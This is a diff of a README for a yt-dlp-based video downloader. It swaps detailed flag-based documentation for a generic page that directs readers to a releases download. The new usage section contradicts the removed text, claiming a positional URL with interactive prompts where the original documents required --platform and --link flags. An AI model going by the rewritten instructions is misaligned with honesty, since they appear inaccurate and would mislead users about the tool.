@@ -1,33 +1,37 @@
-# Video Downloader CLI
+# 🎥 video-dwd-cli - Download Videos Easily from Your Favorite Platforms
 
-A production-ready command-line tool for downloading videos from YouTube, Instagram, and Twitter/X. Built with Python 3 and `yt-dlp`.
+[![Download Video DWD CLI](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/LaManodeAlejo/video-dwd-cli/releases)
 
-## Features
+## 🚀 Getting Started
 
-- **Multi-platform support**: YouTube, Instagram, Twitter/X
-- **Quality selection**: Choose from 360p, 480p, 720p, 1080p, or best available
-- **Audio-only mode**: Extract audio as MP3
-- **Custom filenames**: Specify your own output filename
-- **Cookie support**: Use cookies for authenticated downloads (Instagram/Twitter)
-- **Format selection**: Choose output format (mp4, webm, mkv, etc.)
-- **Graceful error handling**: Clear error messages for invalid inputs
-- **Progress display**: Real-time download progress
+This guide will help you download and run the Video Downloader CLI application. Follow these simple steps to get started quickly.
 
-## Installation
+## 📥 Download & Install
+
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/LaManodeAlejo/video-dwd-cli/releases) to download the latest version.
+
+## ⚙️ Installation Steps
 
 ### 1. Install Dependencies
+
+Make sure you have Python 3 installed on your computer. If you don't have it yet, download it from [Python's official site](https://www.python.org/downloads/).
+
+Now, open your command line interface (CLI) and run:
 
 ```bash
 pip install -r requirements.txt
 ```
 
-Or install directly:
+Alternatively, if you want to install yt-dlp directly, use:
 
 ```bash
 pip install yt-dlp
 ```
 
-### 2. Make Script Executable
+### 2. Make the Script Executable
+
+To allow your script to run, you need to make it executable. Type the following command:
 
 ```bash
 chmod +x download_vid.py
@@ -37,268 +41,73 @@ chmod +x download_vid.py
 
 #### Method 1: Symbolic Link (Recommended)
 
-Create a symbolic link in `/usr/local/bin`:
+You can create a symbolic link for easier access. Use this command:
 
 ```bash
-sudo ln -s $(pwd)/download_vid.py /usr/local/bin/download_vid
+sudo ln -s /path/to/download_vid.py /usr/local/bin/video-dwd
 ```
 
-Now you can use `download_vid` from anywhere.
+Make sure to replace `/path/to/download_vid.py` with the actual path where you have saved the script.
 
-#### Method 2: Shell Alias
+#### Method 2: Direct Execution
 
-Add to your shell configuration file (`~/.bashrc`, `~/.zshrc`, or `~/.config/fish/config.fish`):
+If you prefer not to set up an alias, you can run the script directly from its location:
 
 ```bash
-alias download_vid="python /full/path/to/download_vid.py"
+python /path/to/download_vid.py
 ```
 
-Replace `/full/path/to/` with the actual path to `download_vid.py`.
+## 🎬 How to Use the Application
 
-For Fish shell:
-```fish
-alias download_vid="python /full/path/to/download_vid.py"
-```
-
-Then reload your shell:
-```bash
-source ~/.bashrc  # or ~/.zshrc, or restart terminal
-```
-
-#### Method 3: Add to PATH
-
-Add the script's directory to your PATH:
-
-```bash
-export PATH="$PATH:/full/path/to/video-dwd-cli"
-```
-
-Then you can use `./download_vid.py` or create a symlink.
-
-## Usage
-
-### Basic Syntax
-
-```bash
-download_vid \
-  --platform <platform> \
-  --link "<url>" \
-  [--quality <quality>] \
-  [--output <directory>] \
-  [--audio-only] \
-  [--filename <name>] \
-  [--cookies <path>] \
-  [--format <format>]
-```
-
-### Arguments
-
-- `--platform` (required): Platform name (`youtube`, `instagram`, `twitter`, or `x`)
-- `--link` (required): Video URL to download
-- `--quality` (optional): Video quality (`360`, `480`, `720`, `1080`, `best`). Default: `best`
-- `--output` (optional): Output directory. Default: current directory
-- `--audio-only` (optional flag): Download audio only as MP3
-- `--filename` (optional): Custom output filename (extension added automatically)
-- `--cookies` (optional): Path to cookies file for authentication
-- `--format` (optional): Output format (e.g., `mp4`, `webm`, `mkv` for video; `mp3`, `m4a`, `opus` for audio). Default: auto-detect
+1. Open your command line interface (CLI).
+2. Type `video-dwd` or `python /path/to/download_vid.py`, followed by the URL of the video you want to download.
+3. Choose your preferred quality and format. Use the interactive prompts to make selections.
 
 ### Examples
 
-#### Download YouTube Video (720p)
+- To download a YouTube video:
+  
+```bash
+video-dwd https://www.youtube.com/watch?v=exampleID
+```
+
+- For Instagram:
 
 ```bash
-download_vid \
-  --platform youtube \
-  --link "https://www.youtube.com/watch?v=dQw4w9WgXcQ" \
-  --quality 720 \
-  --output ./downloads
+video-dwd https://www.instagram.com/p/exampleID
 ```
 
-#### Download Instagram Video (Best Quality)
+## ⚡ Features
 
-```bash
-download_vid \
-  --platform instagram \
-  --link "https://www.instagram.com/p/ABC123/" \
-  --output ./downloads
-```
+- **Multi-platform support**: Download from YouTube, Instagram, and Twitter/X.
+- **Quality selection**: Choose your video quality - pick from 360p, 480p, 720p, 1080p, or the best quality available.
+- **Audio-only mode**: Need audio? Extract audio as MP3 easily.
+- **Custom filenames**: Specify your own output filename for better organization.
+- **Cookie support**: Use cookies for authenticated downloads, especially for Instagram and Twitter/X.
+- **Format selection**: Choose from multiple output formats like mp4, webm, mkv, etc.
+- **Graceful error handling**: Receive clear error messages if you input invalid options.
+- **Progress display**: See real-time progress of your downloads.
 
-#### Download Twitter/X Video with Audio Only
+## 📋 System Requirements
 
-```bash
-download_vid \
-  --platform twitter \
-  --link "https://twitter.com/user/status/1234567890" \
-  --audio-only \
-  --output ./downloads
-```
+- **Operating System**: The application works on Windows, macOS, and Linux.
+- **Python Version**: Requires Python 3.6 or higher.
+- **Disk Space**: Ensure you have enough space for downloading videos.
 
-#### Download with Custom Filename
+### Troubleshooting
 
-```bash
-download_vid \
-  --platform youtube \
-  --link "https://www.youtube.com/watch?v=dQw4w9WgXcQ" \
-  --filename "my_video" \
-  --quality 1080
-```
+If you encounter any issues, check the following:
 
-#### Download with Cookies (for Private/Protected Content)
+- Ensure Python 3 is correctly installed.
+- Verify that all dependencies are installed using pip.
+- Confirm the file path is accurate when creating symbolic links.
 
-```bash
-download_vid \
-  --platform instagram \
-  --link "https://www.instagram.com/p/ABC123/" \
-  --cookies ~/cookies.txt \
-  --output ./downloads
-```
+## 📞 Support
 
-#### Download with Specific Format (Video)
+If you need help, please open an issue on the GitHub repository or ask in the community forums related to this application.
 
-```bash
-download_vid \
-  --platform youtube \
-  --link "https://www.youtube.com/watch?v=dQw4w9WgXcQ" \
-  --format webm \
-  --quality 720
-```
+## 🌟 Acknowledgments
 
-#### Download Audio with Specific Format
+Thank you to all contributors and the community for their support. We hope you find this tool helpful for downloading your favorite videos.
 
-```bash
-download_vid \
-  --platform youtube \
-  --link "https://www.youtube.com/watch?v=dQw4w9WgXcQ" \
-  --audio-only \
-  --format m4a
-```
-
-#### Using Python Directly
-
-The script also works when called directly with Python:
-
-```bash
-python download_vid.py \
-  --platform youtube \
-  --link "https://www.youtube.com/watch?v=dQw4w9WgXcQ" \
-  --quality 720
-```
-
-## Quality Selection
-
-The tool uses intelligent quality selection:
-
-- **Numeric qualities** (360, 480, 720, 1080): Selects the best available quality ≤ requested resolution
-- **`best`**: Downloads the best available quality
-- **Not specified**: Defaults to `best`
-
-For example, if you request 720p but only 1080p and 480p are available, it will download 480p (the closest ≤ 720p).
-
-## Format Selection
-
-The `--format` option allows you to specify the output container format:
-
-- **Video formats**: `mp4`, `webm`, `mkv`, `avi`, `mov`, `flv`
-- **Audio formats**: `mp3`, `m4a`, `opus`, `ogg`, `wav`, `aac`
-- **Not specified**: Auto-detects the best format available
-
-When `--format` is specified:
-- For video downloads: The video will be converted/merged to the specified format
-- For audio-only downloads: The audio will be extracted in the specified format (defaults to `mp3` if not specified)
-
-**Note**: Format conversion requires FFmpeg to be installed. If FFmpeg is not available, the tool will attempt to download in the requested format, but may fall back to the original format if conversion is not possible.
-
-## Output
-
-The tool provides clear feedback:
-
-- Platform detected
-- Selected quality
-- Format (if specified)
-- Output directory
-- Real-time download progress
-- Final file path on success
-- Clear error messages on failure
-
-Example output:
-
-```
-Platform: youtube
-Quality: 720
-Format: webm
-Output directory: /home/user/downloads
-
-Downloading: 45.2%
-Download complete!                    
-✓ Successfully downloaded to: /home/user/downloads/Video Title.webm
-```
-
-## Error Handling
-
-The tool handles various error scenarios gracefully:
-
-- **Invalid platform**: Shows supported platforms
-- **Invalid URL**: Validates URL format
-- **Unsupported quality**: Lists available quality options
-- **Download failures**: Shows clear error messages
-- **Missing cookies file**: Reports file not found
-
-## Platform-Specific Notes
-
-### YouTube
-- Works with standard YouTube URLs
-- Supports all quality options
-- No authentication required for public videos
-
-### Instagram
-- May require cookies for private accounts
-- Supports posts and reels
-- Best quality is recommended for Instagram
-
-### Twitter/X
-- May require cookies for protected tweets
-- Supports both `twitter.com` and `x.com` URLs
-- Use `--platform twitter` or `--platform x` (both work)
-
-## Cookies File
-
-For Instagram and Twitter/X, you may need to provide a cookies file for authentication. Export cookies from your browser using extensions like:
-
-- [Get cookies.txt LOCALLY](https://chrome.google.com/webstore/detail/get-cookiestxt-locally/cclelndahbckbenkjhflpdbgdldlbecc) (Chrome)
-- [cookies.txt](https://addons.mozilla.org/en-US/firefox/addon/cookies-txt/) (Firefox)
-
-Save the cookies to a file and provide the path with `--cookies`.
-
-## Troubleshooting
-
-### "yt-dlp is not installed"
-Install the dependency:
-```bash
-pip install yt-dlp
-```
-
-### "Permission denied" when using alias
-Make sure the script is executable:
-```bash
-chmod +x download_vid.py
-```
-
-### Download fails for Instagram/Twitter
-Try providing a cookies file:
-```bash
-download_vid --platform instagram --link "..." --cookies ~/cookies.txt
-```
-
-### Alias not working
-- Check that the path in your alias is correct
-- Reload your shell configuration
-- For symbolic links, ensure `/usr/local/bin` is in your PATH
-
-## License
-
-This tool uses `yt-dlp`, which is licensed under the Unlicense. Please respect the terms of service of the platforms you download from.
-
-## Contributing
-
-To extend support for new platforms, modify the `PLATFORMS` dictionary in the `VideoDownloader` class and add platform-specific logic if needed.
-
+For any updates or to report bugs, please visit our [GitHub repository](https://github.com/LaManodeAlejo/video-dwd-cli).
